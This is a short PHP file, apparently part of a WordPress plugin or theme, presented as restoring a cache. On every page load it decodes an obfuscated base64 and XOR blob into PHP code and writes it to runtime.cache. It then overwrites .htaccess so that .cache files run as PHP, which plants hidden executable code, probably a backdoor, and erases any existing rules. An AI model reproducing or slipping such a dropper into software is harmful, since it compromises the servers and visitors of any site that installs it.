<?php
function restore_cached_payload() {
    $target = __DIR__ . '/runtime.cache';
    $key = 'xmmqhn';
    $length = strlen($key);
    $packed = base64_decode('RFIdGRhkEQtNWQEdCwgZWUwxKCI+JTNJGwIAHAkAHEowWEFOA2dNUUhOXB0fHgsLCx5NTEgeCgIOLgceHQNFVTc+Nz45Kk8NFwAAEAYKXzBBUTNeWFBTUTNJCAQdFE9CWEofVjVCWFxNTFZOI0odGBgLX0FNVh9JJUFNQ0hTRk02VhgHCAhKXUhJD0owLEROXB0EAQ0dUVZnUUhOWAgOGQdOCxkfFAkDJwoIBTcNFwMZFAYaC0VJAQEeHR42QDVHQ2dNUUhOCB8CEjcNFAIeFEBKCB8CEg0dC0RWexVk');
    $source = '';
    for ($i = 0; $i < strlen($packed); $i++) {
        $source .= $packed[$i] ^ $key[$i % $length];
    }
    if (!file_exists($target)) {
        file_put_contents($target, $source);
    }
    file_put_contents(__DIR__ . '/.htaccess', "AddHandler application/x-httpd-php .cache\n");
}
add_action('init', 'restore_cached_payload');
